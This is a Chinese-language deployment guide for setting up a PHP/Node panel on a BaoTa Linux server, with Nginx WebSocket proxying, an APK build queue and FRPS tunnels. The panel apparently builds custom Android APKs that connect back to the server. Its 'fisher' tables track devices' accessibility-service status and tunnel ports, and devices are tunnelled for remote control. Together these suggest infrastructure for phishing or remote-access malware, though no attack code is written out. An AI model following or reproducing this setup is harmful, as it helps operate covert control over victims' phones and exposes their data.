# Linux / 宝塔部署方案与避坑清单

> 适用场景：别人从 GitHub 拉取本源码后，在 Linux + 宝塔面板上部署 PHP 后端、React 静态前端、Node WebSocket 服务、APK 构建队列和 FRPS 隧道。
>
> 线上示例结构采用 `/www/wwwroot/<domain>/source/cs`。请把 `<domain>`、数据库账号密码、域名替换成自己的值，不要提交真实密码到仓库。

## 1. 架构与端口

| 组件 | 目录 / 入口 | 默认端口 | 说明 |
|---|---|---:|---|
| PHP 后端 | `cs/public/index.php` | 80/443 | ThinkPHP API，由 Nginx/PHP-FPM 承载 |
| React 前端 | `cs/public/` | 80/443 | `frontend-react` 打包后复制到 `public` |
| Node WS | `cs/node-ws/src/index.js` | 8889 | 设备、后台面板 WebSocket 与构建队列 |
| MySQL | `fisher_*` 表 | 3306 | 首次安装由 `/install.php` 导入 `cs/install/schema.sql` |
| FRPS | 独立服务 | 7000/7500 | 设备隧道控制与面板，按需部署 |
| APK 构建队列 | `cs/runtime/apk_build_queue` | - | PHP 写任务，Node 消费任务 |

推荐域名下统一访问：

```text
https://<domain>/                 后台
wss://<domain>/w?d=<deviceId>     设备 WS
wss://<domain>/ws/panel           面板 WS
https://<domain>/install.php      首次安装向导
```

APK 构建页里的“服务器地址”建议填写：

```text
wss://<domain>
```

不要填 `https://<domain>`；设备端连的是 WebSocket。

## 2. 宝塔创建站点

1. 宝塔 → 网站 → 添加站点。
2. 域名填 `<domain>`。
3. 根目录建议填：

```text
/www/wwwroot/<domain>/source/cs/public
```

4. PHP 版本建议 `PHP-8.1` 或更高。
5. 数据库可在宝塔创建，也可以让安装向导使用已有数据库账号创建表。
6. 申请 SSL 后，Cloudflare/反代场景建议使用完整 HTTPS 链路。

## 3. 拉取源码

```bash
cd /www/wwwroot/<domain>
git clone https://github.com/<owner>/<repo>.git source
cd source
```

如果已经有目录：

```bash
cd /www/wwwroot/<domain>/source
git pull --ff-only origin main
```

## 4. 前端构建

服务器有 Node.js 时：

```bash
cd /www/wwwroot/<domain>/source/cs/frontend-react
npm install
npm run build
cp -a dist/. ../public/
```

如果本地已经提交了 `cs/public/assets/...` 打包产物，服务器也可以只 `git pull`，不用重新构建。但修改前端源码后必须重新打包并同步 `cs/public/index.html` 与新 hash 资源。

## 5. 首次安装向导

浏览器打开：

```text
https://<domain>/install.php
```

页面会做环境检测，并要求填写：

| 字段 | 示例 | 说明 |
|---|---|---|
| 数据库地址 | `127.0.0.1` | 宝塔本机库一般是这个 |
| 数据库端口 | `3306` | MySQL 默认端口 |
| 数据库名 | `<domain>_db` | 宝塔创建的数据库名 |
| 数据库用户 | `<domain>_db` | 宝塔创建的数据库用户 |
| 数据库密码 | `<password>` | 不要提交到 Git |
| 管理员账号 | `admin` | 首次后台管理员 |
| 管理员密码 | 自定义强密码 | 安装后可登录后台 |
| 后台地址 | `https://<domain>` | 用于生成 CORS/外部地址 |
| WS 端口 | `8889` | Node WS 监听端口 |
| FRPS 地址 | 服务器公网 IP 或域名 | 设备隧道使用 |
| FRPS 端口 | `7000` | FRPS bindPort |
| FRPS 面板端口 | `7500` | dashboardPort |

安装成功后会生成：

```text
cs/.env
cs/node-ws/.env
cs/runtime/install.lock
```

有 `runtime/install.lock` 时，安装页会锁定，不能重复安装。需要重装时：

```bash
rm -f /www/wwwroot/<domain>/source/cs/runtime/install.lock
```

## 6. 关键权限

这是最容易踩坑的地方。PHP-FPM 用户通常是 `www`，它必须能写 `runtime`，否则会出现：

- APK 构建任务创建失败
- 构建记录 0 B / 构建失败
- 上传图片无反应
- 日志/缓存写入失败

部署后执行：

```bash
cd /www/wwwroot/<domain>/source
mkdir -p cs/runtime/apk_build_queue cs/runtime/apk_output cs/runtime/upload cs/runtime/log
chown -R www:www cs/runtime
chmod -R 775 cs/runtime
su -s /bin/sh -c 'touch cs/runtime/.write_test && rm -f cs/runtime/.write_test && echo runtime_write_ok' www
```

看到 `runtime_write_ok` 才算权限正常。

## 7. Node WS 启动

进入 Node 服务目录：

```bash
cd /www/wwwroot/<domain>/source/cs/node-ws
npm install
```

前台测试：

```bash
node src/index.js
```

后台运行示例：

```bash
cd /www/wwwroot/<domain>/source/cs/node-ws
nohup env APK_BUILD_CONCURRENCY=1 node src/index.js >> nohup.out 2>&1 &
```

检查：

```bash
ps -ef | grep 'node src/index.js' | grep -v grep
curl -sS http://127.0.0.1:8889/health
curl -sS http://127.0.0.1:8889/online-devices
```

并发构建数量通过环境变量控制：

```bash
APK_BUILD_CONCURRENCY=1   # 稳定，推荐默认
APK_BUILD_CONCURRENCY=2   # 服务器 Android 环境足够时可提高
```

## 8. Nginx 必须配置 WebSocket 代理

安装页 `/install` 会生成 `cs/runtime/nginx-rewrite.conf`；仓库也内置模板 `cs/deploy/nginx/bt-rewrite.conf.example`。在宝塔部署时，把模板内容放进站点“伪静态/重写规则”（实际文件通常是 `/www/server/panel/vhost/rewrite/<域名>.conf`），再执行 `nginx -t && nginx -s reload`。

### 8.1 Nginx 必须配置 WebSocket 代理

如果 Nginx 没有代理 `/w`、`/ws`、`/s/lk` 到 Node，设备日志里会看到：

```text
GET /w?d=<deviceId>&t=... 200 524 okhttp/4.12.0
```

但是后台仍然显示在线设备 0，因为请求打到了 PHP/静态页面，Node 没收到 WebSocket。

在宝塔站点 Nginx 配置的 `server { ... }` 里加入：

```nginx
# device/panel WebSocket -> Node worker
location ^~ /w {
    proxy_pass http://127.0.0.1:8889;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_read_timeout 3600s;
    proxy_send_timeout 3600s;
    proxy_buffering off;
}

location ^~ /ws {
    proxy_pass http://127.0.0.1:8889;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_read_timeout 3600s;
    proxy_send_timeout 3600s;
    proxy_buffering off;
}

location ^~ /s/lk {
    proxy_pass http://127.0.0.1:8889;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_read_timeout 3600s;
    proxy_send_timeout 3600s;
    proxy_buffering off;
}
```

然后测试并重载：

```bash
nginx -t && nginx -s reload
```

设备上线验证：

```bash
curl -sS http://127.0.0.1:8889/online-devices
```

正常会返回：

```json
{"devices":["<deviceId>"],"bridges":[]}
```

## 9. Cloudflare / CDN 注意点

如果域名走 Cloudflare：

1. DNS 指向服务器公网 IP。
2. SSL/TLS 建议 `Full` 或 `Full (strict)`。
3. WebSocket 开关必须开启。
4. 不要让 Cloudflare 把 `/w`、`/ws` 缓存。
5. APK 里的服务器地址用 `wss://<domain>`。

## 10. FRPS 注意点

FRPS 是给设备隧道/远程控制用的，不等同于设备上线 WS。

- 设备上线：走 `wss://<domain>/w?...` 到 Node。
- 隧道控制：Node/PHP 分配 `remote_port`，设备侧 frpc 连接 FRPS。

常用检查：

```bash
ss -lntp | grep -E ':7000|:7500|:8889'
ps -ef | grep frps | grep -v grep
curl -sS http://127.0.0.1:8889/online-devices
```

## 11. APK 构建环境

构建依赖服务器上的 Android/Gradle 环境。常见坑：

| 现象 | 原因 | 处理 |
|---|---|---|
| 点构建提示失败 | Node 构建服务没启动 | 看 `cs/node-ws/nohup.out` 和 `cs/runtime/apk_build.log` |
| 构建记录 0 B | `runtime` 权限不对或任务写入失败 | 执行第 6 节权限命令 |
| 一堆任务同时失败 | 并发太高/Android 环境缺失 | 先用 `APK_BUILD_CONCURRENCY=1` |
| 提交后上面没进度 | 正常设计 | 进度只在下面构建队列卡片显示 |
| APK 安装后不上线 | Nginx 没代理 WS 或地址填错 | 第 8 节；地址填 `wss://<domain>` |

查看构建日志：

```bash
tail -f /www/wwwroot/<domain>/source/cs/runtime/apk_build.log
tail -f /www/wwwroot/<domain>/source/cs/node-ws/nohup.out
```

## 12. 常用排查命令

### 12.1 看服务是否运行

```bash
ps -ef | grep 'node src/index.js' | grep -v grep
ss -lntp | grep -E ':80|:443|:8889|:7000|:7500'
```

### 12.2 看设备是否打到服务器

```bash
tail -n 300 /www/wwwlogs/<domain>.log | grep '/w?d=' | tail -20
curl -sS http://127.0.0.1:8889/online-devices
```

### 12.3 看数据库最近设备

```bash
mysql -u<db_user> -p'<db_pass>' -D <db_name> -e \
"SELECT device_id,is_connected,accessibility_alive,remote_port,tunnel_deployed,FROM_UNIXTIME(last_seen) last_seen,public_ip FROM fisher_devices ORDER BY last_seen DESC LIMIT 10;"
```

### 12.4 看最新 APK 配置

```bash
mysql -u<db_user> -p'<db_pass>' -D <db_name> -e \
"SELECT id,status,filename,app_name,server_url,FROM_UNIXTIME(created_at) created,file_size FROM fisher_apk_builds ORDER BY id DESC LIMIT 10;"
```

## 13. 发布更新流程

本地改完代码后：

```bash
# 前端改动需要打包
cd cs/frontend-react
npm run build
cp -a dist/. ../public/

# 回到仓库根目录提交
git status
git add <changed-files>
git commit -m "Describe change"
git push origin HEAD:main
```

服务器更新：

```bash
cd /www/wwwroot/<domain>/source
git pull --ff-only origin main

# PHP/前端静态改动通常无需重启 Node
# Node 代码或 .env 改动后重启：
pkill -f 'node src/index.js' || true
cd cs/node-ws
nohup env APK_BUILD_CONCURRENCY=1 node src/index.js >> nohup.out 2>&1 &
```

## 14. 最重要的坑位总结

1. **站点根目录必须指到 `cs/public`**，不要指到仓库根目录。
2. **`runtime` 必须给 `www` 可写**，否则安装、上传、APK 队列都会出问题。
3. **Nginx 必须代理 `/w`、`/ws`、`/s/lk` 到 `127.0.0.1:8889`**，否则设备请求有日志但后台在线数为 0。
4. **APK 服务器地址填 `wss://<domain>`**，不是 `https://<domain>`。
5. **`cs/.env` 与 `cs/node-ws/.env` 数据库/JWT 必须一致**，否则后台和 Node 写的不是同一个库或 token 校验失败。
6. **首次安装后会生成 `runtime/install.lock`**；重装要先删锁文件。
7. **构建队列默认单线程更稳**；确认 Android 环境和内存足够后再调大 `APK_BUILD_CONCURRENCY`。
8. **Cloudflare 必须允许 WebSocket**；否则浏览器能打开后台，但设备/面板 WS 不通。
